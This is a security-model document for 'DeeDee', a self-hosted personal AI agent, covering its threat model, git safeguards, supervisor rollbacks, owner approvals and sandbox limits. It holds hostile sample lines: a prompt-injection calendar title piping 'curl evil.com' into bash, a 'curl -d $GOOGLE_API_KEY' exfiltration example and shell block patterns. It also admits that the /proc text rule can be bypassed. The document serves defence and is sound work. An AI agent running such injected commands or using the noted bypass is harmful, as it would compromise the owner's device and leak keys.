# Security Model 🛡️

DeeDee operates on a **"YOLO but Safe"** model. This means we prioritize **Personal Capability** over enterprise-grade restriction, but with specific guardrails to prevent catastrophic errors or malicious remote manipulation.

## Threat Model

### 1. Repository Leakage
**Risk**: The agent autonomously commits code containing API Keys (`sk-...`, `AIza...`, `ghp_...`).
**Mitigation**:
- **Pull requests only**: `commitAndPush` never pushes `master`. It builds one commit in a throwaway index (`read-tree`, `add`, `write-tree`, `commit-tree`), pushes it to a new branch `deedee/self/<UTC time>`, and opens a pull request through the GitHub REST API with `GITHUB_PAT` (needs contents and pull requests write). CI runs the full suite on the pull request; the owner reviews and merges. The work tree keeps the edits; after the merge the agent calls `pullLatestChanges`.
- **The supervisor runs no agent-written code**: the agent writes `/app/source` as root, and the supervisor used to run `npm test` there and run git with that tree's `.git`, whose hooks, `core.hooksPath`, `core.fsmonitor`, filter drivers and `gpg.program` start programs. The supervisor held the engine socket, so any of those was root on the device. Now:
    - No test run. The verifier only parses `.js/.mjs/.cjs` files with `node --check` (parse only, absolute path, `PATH` as the only variable, cwd outside the tree, 20 s limit), and skips symlinks.
    - Its own git dir: `$SUPERVISOR_STATE_DIR/repo.git` on the supervisor-only volume, used with `--work-tree=/app/source`. The `.git` folder in the work tree is never read as a repository, so hooks, config and filters the agent writes there do nothing. `.gitattributes` in the tree can only name built-in attributes, because every driver needs config the agent cannot write. On its first start the supervisor reads the old `.git/HEAD` as plain text, fetches that commit, and starts its index there, so local edits stay edits.
    - Every git command also carries `-c core.hooksPath=/dev/null -c core.fsmonitor=false -c commit.gpgSign=false -c credential.helper= -c protocol.ext.allow=never`, with `GIT_CONFIG_NOSYSTEM=1` and `GIT_CONFIG_GLOBAL=/dev/null`.
    - The secret scan and the syntax check only read regular files reached without a symlink, so a link cannot make the supervisor read one of its own files.
- **Pre-Commit Scan**: `GitOps.commitAndPush` scans all changed files for regex patterns matching known secrets. If one is found, nothing is pushed.
- **No `git add .`**: tracked changes are staged with `git add -u -- <paths>`. Untracked files are staged one by one, and only when they live under `apps/`, `packages/`, `docs/` or `specs/` with an allowed extension (`.js .jsx .mjs .cjs .ts .json .md .yml .yaml .py .txt .css .sh .svg .png`) or the bare name `Dockerfile`. Root-level files, `data/` and `*.db` never get staged. Skipped files are logged and returned as `skipped` in the result. When a skipped file sits under one of the allowed folders, `commitAndPush` returns `success: false` and names it, so the agent sees the drop instead of a partial commit.
- **No `.github/` or `.git/` change, tracked or not**: a workflow file on a branch of this repository runs in CI with the repository's secrets as soon as a pull request opens. `commitAndPush` refuses the whole change when any path has a `.github` or `.git` segment. The file tools refuse to write there too.
- **Safe file names**: `git status --porcelain -z` supplies the names, so the agent chooses them. Only names made of `A-Z a-z 0-9 . _ / @ - + [ ]` pass; anything else is skipped before the verifier and before `git add`. `git add` runs with `--literal-pathspecs`, because `[id]` in a Next.js route folder is a glob to git.
- **Token per command**: the GitHub PAT never enters a stored remote URL or config. `fetch` and `push` pass `-c http.<remote URL>.extraheader=Authorization: Basic …` built from `GITHUB_PAT`, and address `GIT_REMOTE_URL` directly, never a remote name. The REST API gets the token as a bearer. Failure text from git and from the API is scrubbed before it reaches the logs or the agent.
- **Identity per command**: commits pass `-c user.name=… -c user.email=…` from `GIT_USER_NAME` / `GIT_USER_EMAIL`.
- **CI permissions**: `ci.yml` runs agent-written tests on pull requests. It declares `permissions: contents: read` and checks out with `persist-credentials: false`, so a test cannot read a write token from the runner's `.git/config`. Branch protection on `master` is the owner's setting and the remaining guard.

### 2. Remote Code Execution (RCE) via Prompt Injection
**Risk**: An attacker sends a calendar invite or email with a title like `Meeting | curl evil.com | bash`. If the agent processes this text into a shell command, the device is compromised.
**Mitigation**:
- **Confirmation Manager**:
    - **Held for approval**: `| bash`, `| sh`, `| python`, `| node`, `bash <(...)`, `sh -c "$(...)"`, `rm -rf /`, writes under `/etc`, `mkfs`, `dd` to a disk. See **Approvals** below.
    - **Allowed**: `curl`, `wget`, `ls`, `grep` (Standard tools are fine).
- **Untrusted Sources**: (Future) Inputs from Email/Calendar will be tagged as "Untrusted" and prevented from triggering specific tools.

### 3. Logic Failure
**Risk**: The agent pushes an update that runs (no crash) but is logically broken (e.g. infinite loop, or always returns empty text).
**Mitigation**:
- **Supervisor Integration Tests**:
    - Every hour, the Supervisor sends a `POST /v1/chat` request (`HEALTH_CHECK_PING_123`) to the Agent.
    - If the Agent does not reply with a correct confirmation, the Supervisor rolls back the code.
- **Rollback through a revert pull request (self-improvements only)**:
    - The supervisor never pushes `master`, rollbacks included. Self-improvements reach `master` only when the owner merges their pull request, and a rollback is a pull request too.
    - The supervisor records every self-improvement pull request it opened in `$SUPERVISOR_STATE_DIR/self-pull-requests.json` (number, branch, commit).
    - When the health check fails `rollbackThreshold` (5) times in a row, the supervisor asks GitHub about the recorded pull requests. If one merged within `SUPERVISOR_ROLLBACK_WINDOW_MINUTES` (default 60: a Balena build and download can take well over ten minutes) and has no revert yet, it alerts on Slack and opens a pull request that reverts its merge commit on top of `origin/master` (`git diff` of the merge against its first parent, applied in reverse to a throwaway index; no work tree, no hook). The owner merges it; that merge is the rollback. It acts once per failure streak and never reverts a pull request twice.
    - Owner commits never get a revert. Revert pull requests are not recorded, so a revert is never reverted.
    - `rollbackLastChange` (`POST /cmd/rollback`) opens a revert pull request for the newest commit on `master`.
    - `.last_boot_commit` (startup notice) and the pull request record live in `SUPERVISOR_STATE_DIR` (default `/app/state`, the `supervisor-state` volume). The agent cannot reach it.
    - Every outbound `fetch` (agent health, deep check, Slack) uses `AbortSignal.timeout(10000)`. A hung Slack call cannot stall start-up.
    - `SUPERVISOR_AUTO_ROLLBACK=false` turns the revert pull request off. Alerts stay on.

## Access Control

### Filesystem
- **Read/Write**: `/app/source` (The repo itself).
- **Read/Write**: `/app/data` (Persistent DBs). The shell reaches `output/`, `journal/`, `vaults/`, `vinyl_covers/` and `wardrobe/` only, and only by a path with no glob and no `..`. The rest of the volume — the browser profile and its secrets file, the WhatsApp session, the Google credentials, the databases — is refused.
- **Supervisor only**: `/app/state` (`supervisor-state` volume: the supervisor's git dir, the pull request record, the boot hash). Not mounted into the agent.
- **File tools** (`readFile`, `writeFile`, `listDirectory`): every path resolves through `fs.realpath` (the nearest existing folder for a new file) and must land inside `/app/source`, so a symlink the shell planted cannot reach `/`. A link to a missing target is refused. Writes under `.git/` or `.github/` are refused. Files git tracks come back unredacted, because the redactor's line rules turned ordinary code into `[REDACTED]`; untracked files and anything under `.git/` still go through it. `writeFile` refuses content that holds `[REDACTED`, so a redacted read can never be written back. The shell can still swap a link between the check and the open: this guards the file tools, it is not a boundary against the shell.
- **Interfaces only**: `interfaces-data` (WhatsApp session credentials and message database). Not mounted into the agent: a shell command there would have read the credentials that own the owner's WhatsApp account. The agent asks the interfaces service for the day's messages over `GET /internal/whatsapp/messages-by-date` (bearer `DEEDEE_INTERNAL_TOKEN`, which an `DEEDEE_API_TOKEN` holder does not have).
- **Read-Only**: `/proc`, `/sys`.

### Network
- **Outbound**: Unrestricted (needed for API calls, fetch).
- **Inbound**: None (container isolation).
- **Service Mesh**:
    - **`apps/web`**: Public UI. Browser-facing auth handled by the built-in `/login` page (password + passkey, signed JWT cookie). See **User Authentication** below.
    - **`apps/api`**: Public Gateway. `/v1/*` enforces Bearer Auth (`DEEDEE_API_TOKEN`). `/socket.io` verifies the session JWT cookie issued by `apps/web` (shared `SESSION_SECRET`).
    - **`apps/agent`**: Internal Only. Protected by Docker Network isolation **plus** `DEEDEE_INTERNAL_TOKEN` on `/internal/*` (defense-in-depth so accidental port exposure doesn't leak vault files / wardrobe images / journal data). Enforces Path Validation on Journal Ops.
    - **`apps/supervisor`**: Internal Only. Protected by `SUPERVISOR_TOKEN` to prevent SSRF->RCE lateral movement. It reads container logs through the balena supervisor API (`io.balena.features.supervisor-api`), not the engine socket: the socket was mounted only for logs, and it could start a privileged container. A read-only mount would not help, because a read-only bind mount does not stop writes to a socket. The supervisor API can restart services and read the journal, but cannot run a container of its choosing. Log requests name a service from a fixed list.

## User Authentication

DeeDee is single-user. Browser sessions are gated by a self-contained `/login` page; no reverse-proxy forward-auth required.

- **Password**: scrypt hash (N=32768, r=8, p=1) stored in `data/auth.json` on the `web-data` Docker volume. Set via `LOGIN_PASSWORD` env var (idempotent on every boot — also acts as the recovery path) or `npm run auth:init`.
- **Passkeys (WebAuthn)**: Optional. Self-service enrollment at `/settings/security`. Requires `WEBAUTHN_RP_ID` + HTTPS `WEBAUTHN_ORIGIN`. Disabled automatically on plain HTTP except `localhost`.
- **Sessions**: Signed JWT (HS256 + `SESSION_SECRET`) in an `httpOnly; Secure; SameSite=Lax` cookie. 30-day TTL with sliding refresh — re-issued on the next authenticated request once the token is past half-life, so weekly use never requires re-login.
- **Logout**: Clears the cookie and adds the JTI to the revocation list in `auth.json`. Rotate `SESSION_SECRET` to invalidate all outstanding sessions.
- **Rate limit**: `/api/auth/login`, `/api/auth/passkey/login/*` and `/api/auth/password` are capped at 5 attempts per 15 minutes per IP.
  A second, global bucket counts failed password logins across all IPs: 50 failures in 10 minutes pause password sign-in (429, `paused: true`).
  Only `/api/auth/login` reads or feeds that bucket, so passkey sign-in and the session-gated password change keep working during a spray.
- **Cross-subdomain (two-subdomain deploy)**: Set `COOKIE_DOMAIN=.example.com` so the cookie rides to `api.example.com` for socket.io. WebAuthn RP ID stays scoped to the UI subdomain.
- **Backups**: `web-data` (containing `auth.json`) is **excluded from the backup recipe**. Recovery is "set `LOGIN_PASSWORD` again, restart web, re-enroll passkeys" — safer than backing up the password hash and credential public keys.

For the env-var inventory and two-subdomain vs single-subdomain recipes, see the [Authentication Setup](../README.md#-authentication-setup) section in the README.

### Tools
- **GSuite**: Full Read/Write access to Calendar and Mail. Every email send waits for the owner (see Approvals).
- **Home Assistant**: Full Control (lights, switches, media, climate, covers). Locks, the alarm, opening a garage door and mass actions wait for the owner.

## Subprocess environments

The agent process holds every provider key. Child processes do not.

- **Shell tools**: `runShellCommand` starts its child with `PATH`, `HOME`, `TZ`
  and `LANG` only. `SHELL_ENV_PASSTHROUGH` (names separated by commas or
  spaces) adds more. A command like `curl -d "$GOOGLE_API_KEY" https://…`
  therefore sends nothing, which matters because output redaction cannot help
  when a command returns no output. **This is a guard rail, not a boundary.**
  The child still runs as root and shares the container's `/proc`, where the
  agent's own `/proc/<pid>/environ` holds the keys the process started with.
  `BLOCKED_PATTERNS` refuses every spelling of `/proc` and the word `environ`,
  but the rules read the command text, so a command that builds the path
  another way gets through. The fix that holds is a separate, unprivileged uid
  for the shell child; it is open work (Batch 6).
- **MCP servers**: every stdio server starts with a fixed base list
  (`MCP_BASE_ENV_VARS` in `apps/agent/src/mcp-manager.js`: shell, locale, TLS
  trust store, python and Chromium paths) plus the variables its own block in
  `mcp_config.json` names, with `${VAR}` placeholders resolved from the
  agent's environment. So the Plex server sees `PLEX_TOKEN` and nothing else.
  `MCP_ENV_PASSTHROUGH` adds names to the base for every server.
- **Output redaction** stays as a second layer: values of secret-named
  variables, secret-named `NAME=value` lines, GitHub tokens (`ghp_`, `ghs_`,
  `github_pat_`) and any URL carrying a user or password are replaced before
  tool output reaches the model, the logs or the database.

## Secrets the API never serves

- **Settings**: `GET /internal/settings` (proxied as `/v1/settings`) replaces
  every secret-looking value with `{ __secret: true, set: boolean }`. A save
  that sends the marker back keeps the stored value; `""` clears it. Saves
  broadcast the setting name only, because a socket reaches every client.
- **Browser secrets**: `GET /v1/browser-secrets` returns names.
  `PUT`/`DELETE /v1/browser-secrets/<NAME>` set or remove one. The Settings
  page can show that a secret is set, replace it and remove it, without ever
  receiving a value.

## Approvals

Some tool calls pause until the owner says yes. Before this change the
prompt went to the chat that started the run. For a scheduled job or a
watcher that chat is synthetic, so the prompt was dropped and the action
was denied without anyone knowing. Now the prompt reaches the owner, the
pending call survives a restart, and `/confirm <id>` works from any of his
chats. The owner values capability over restriction: everyday actions run
unasked, and jobs stay quiet unless they truly need him.

**What pauses** (`apps/agent/src/confirmation-manager.js`, flags in `tools-definition.js`):
- every email send (`sendEmail`, Gmail `messages.send` / `drafts.send`);
- the first `sendMessage` to a contact the owner never messaged through Deedee (the old `force: true` retry is gone; an approved call opens the contact);
- Home Assistant `lock` (lock and unlock), `alarm_control_panel` (arm and disarm), opening a cover whose id reads as a garage or gate (`garage`, `gate`, `portón`, `cochera`, `driveway`), the `homeassistant`/`hassio` domains, automations off, and `entity_id: all` on any domain except lights/switches/media off and lights on. `ha_bulk_control` pauses only when one of its operations touches those. Climate, blinds, closing the garage and bulk light control run unasked;
- appointment tools named `*book_appointment` / `*cancel_appointment` (Allende) and `*book_turn` / `*cancel_turn` (Pilotfy);
- `commitAndPush` (code that will run on the device);
- data-destroying deletes: `deletePerson`, `deleteVault`, `delete_garment`, `deleteDeviceAlias` (per-tool flags), Plex deletes and edits, and `ha_config_remove_*` / `ha_remove_device|entity|zone|area_or_floor|helpers_integrations`. Everyday removals run unasked: `ha_remove_todo_item`, Plex `playlist_remove_from` / `collection_remove_from`, `remove_from_wardrobe_trip_capsule`, `cancelJob`;
- shell commands that pipe remote content into an interpreter, damage the system, touch the databases, the WhatsApp credentials volume, the browser profile, `/proc`, a closed folder of the data volume or the CDP port. The rule reads the same list the local MCP server refuses (`BLOCKED_PATTERNS` in `packages/mcp-servers/src/local/index.js`), so the two layers cannot drift apart.

A rule that throws on odd arguments counts as a hit. A malformed call is
held, never let through.

**Where the prompt goes** (`apps/agent/src/services/approval-service.js`):
- web, Telegram and the owner's own WhatsApp chat: the same chat (`interactive`);
- scheduled jobs (whatever chat they were created from), system runs, watcher
  runs, other WhatsApp chats: the owner channel from `notification_channel`
  (`deferred`), through the delivery ledger (`docs/notifications.md`, kind
  `approval`) with the fallback channel. A job created from a web chat also
  gets a copy of the card in that web chat, with Approve / Deny buttons;
- sub-agents cannot ask; the tool result tells them to report the need to the parent.

The row is keyed by the chat that must answer, not by the chat that
started the run, so a watcher run on a contact's message never asks the
contact.

**The card** names the tool, the key arguments (values under keys such as
`password`, `token`, `secret` show as `<redacted>`), the reason, where the
run came from, and how to answer. Web chats also get Approve / Deny
buttons; the dashboard bell gets a notification.

**Answers**: `/confirm <id>`, `/approve <id>`, `/cancel <id>`, `/deny <id>`
work from any of the owner's chats (web, his Telegram, his WhatsApp);
`/approvals` lists every pending row. A plain reply (`yes`, `si`, `sí`,
`ok`, `dale`, `approve`, `confirm`; `no`, `cancel`, `cancelar`, `deny`)
counts only when all three hold: the card was delivered to this very chat
(for a job, that is the owner channel), it is the only approval pending
there, and no `askUser` question is open there. In every other case the
word goes on to `askUser` and the model, so an "ok" typed to the model in
another chat never fires a job's paused action. When a question is open,
`askUser` reads the reply first. The bare `/confirm` and `/cancel` act only
with exactly one approval pending in the chat they are typed in; with
several, the reply lists the ids and an id (or a unique prefix of at least
3 characters) is required. Only the first answer counts. The owner's
WhatsApp LID and his phone JID are the same chat.

**What runs after yes**: an interactive call resumes in its chat as before
(`EXECUTE_PENDING`). A deferred call runs from the service with the stored
arguments in the original run's context (source, chat id, job name), and
the result summary goes back to the chat the answer came from. The
executor receives `context.approved = true`.

**Expiry**: a sweeper runs every minute. Chat approvals expire after 30
minutes, job and watcher approvals after 6 hours. Both live in the
`approvals` agent setting (`ttlInteractiveMin`, `ttlDeferredHours`).
Pending rows survive a restart; only overdue ones are dropped at boot. An
overdue row the sweeper has not reached yet cannot be approved or denied,
from the chat, the settings card or the API: `decide()` marks it expired
and says so.

**Deny-list**: `approvals.deny` holds glob patterns matched against
`toolName:argsJson` (keys sorted); a pattern without `:` matches the tool
name alone. A hit fails the call at once in every mode, jobs included, and
nothing is sent to the owner. Env fallback: `APPROVALS_DENY`, patterns
separated by `;` or newlines. Example: `runShellCommand:*rm -rf*;commitAndPush`.

**Where to look**: Settings > Approvals (pending list with Approve / Deny,
TTLs, deny-list editor); `GET /v1/approvals`, `POST /v1/approvals/:id/approve|deny`
(agent: `/internal/approvals`, behind `DEEDEE_INTERNAL_TOKEN`); table
`pending_confirmations` in `agent.db`; logs with the `[Approvals]` prefix.

Still open (Batch 6): an exact allowlist for `runShellCommand` and network
tools instead of pattern checks, and a separate unprivileged uid for the shell
child, so file modes and `/proc` stop a read that a text rule misses.

## Personal data guard

The repo is public. `scripts/check-pii.js` blocks personal data and secrets before they land. It needs Node only, no packages.

**What it blocks**
- Argentine phone numbers (`549` + 8-10 digits) and any other run of 11 or more digits. There is no upper bound, so 16-digit card-like numbers are checked too.
- WhatsApp ids with real-looking digits: `<digits>@s.whatsapp.net`, `<digits>@lid`, `<digits>@g.us`.
- Secret-looking tokens: Google API keys (`AIza`) and OAuth tokens (`ya29.`), Slack tokens (`xoxb-`, `xoxa-`, `xoxp-`) and webhook URLs, GitHub tokens (`ghp_`, `github_pat_`), Tailscale keys (`tskey-`), private key blocks.
- Private LAN addresses (`10.x.x.x`, `192.168.x.x` with numeric octets).
- Anything that matches your local `.pii-denylist` (see below).

**What it allows**
- Digit runs with fewer than 4 distinct digits (`5490000000000`, `100000000000001`), `549` plus a near-constant tail (`5490000000001`), monotone sequences (`1234567890`) and the fictional US 555 range (`15551234567`).
- Epoch milliseconds: 13-digit runs from `1500000000000` to `1999999999999`, that is 2017-07-14 to 2033-05-18. Timestamps outside that range trip the guard; use `1700000000000` in fixtures.
- Telegram supergroup and channel ids: `-100` followed by 10 digits, sign included. The same digits without the sign are checked as a normal long number.
- Token placeholders made of repeated characters (`AIzaXXXX...`, `xoxb-XXXX`).
- A line that carries `pii-guard: allow`. Use it only for pattern definitions and synthetic test fixtures.

**Where it runs**
- `.husky/pre-commit` scans the staged diff on every commit.
- The `pii-guard` job in `.github/workflows/ci.yml` scans added lines on pull requests (`--range origin/master...HEAD`) and the whole tree on pushes to `master`.

**Run it yourself**
```bash
node scripts/check-pii.js                                # whole tree
node scripts/check-pii.js --range origin/master...HEAD   # your branch
node scripts/check-pii.js --staged --fix-hints           # staged changes, with placeholder hints
```
Each hit prints as `file:line: <masked match> [rule]`. Exit code 1 means hits, 2 means a usage or git error. Denylist problems never change the exit code.

**Denylist for names**
Names cannot go into a public pattern list. Put them in `.pii-denylist`: one regex per line, `#` starts a comment, matching ignores case. The guard looks in this order and uses the first file it finds:
1. the path given with `--denylist <file>`;
2. `.pii-denylist` at the repo root (gitignored, so it stays on your machine and CI never sees it);
3. `$HOME/.config/deedee/.pii-denylist`, which covers every clone and worktree at once.

When no file exists the guard prints one hint line (`pii-guard: no denylist found ...`) and checks the built-in rules only; the exit code does not change. A line that is not a valid regex prints a warning and is skipped; the other lines still apply.

**History**
Commits from before this guard may still hold phone numbers or ids. The guard does not scan history. The owner decides whether to rewrite history, which changes every commit hash and forces every clone to re-fetch, or to accept it and rotate anything that was exposed.
